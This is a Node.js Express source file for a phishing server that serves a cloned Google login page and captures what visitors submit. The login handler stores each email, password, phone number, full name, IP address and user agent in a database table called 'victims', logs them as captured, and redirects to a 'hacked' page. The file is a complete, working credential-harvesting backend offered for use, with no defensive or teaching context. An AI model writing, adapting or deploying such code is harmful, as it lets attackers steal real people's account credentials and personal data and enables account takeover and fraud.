const express = require('express');
const { neon } = require('@neondatabase/serverless');
const dotenv = require('dotenv');

dotenv.config();

const app = express();
const sql = neon(process.env.DATABASE_URL);

app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));
app.set('view engine', 'ejs');

// Landing Page - Google Login Clone
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});

// Capture Credentials
app.post('/login', async (req, res) => {
  const { email, passwd, mobile, fullname } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const ua = req.headers['user-agent'];

  await sql`
    INSERT INTO victims (full_name, email, password, mobile, ip_address, user_agent)
    VALUES (${fullname}, ${email}, ${passwd}, ${mobile}, ${ip}, ${ua})
  `;

  console.log(`[+] Captured: ${email} | ${passwd} | ${fullname} | ${mobile}`);

  res.redirect('/hacked');
});

// Hacked Page
app.get('/hacked', (req, res) => {
  res.render('hacked');
});

app.listen(process.env.PORT, () => {
  console.log(`[+] Server running on http://localhost:${process.env.PORT}`);
});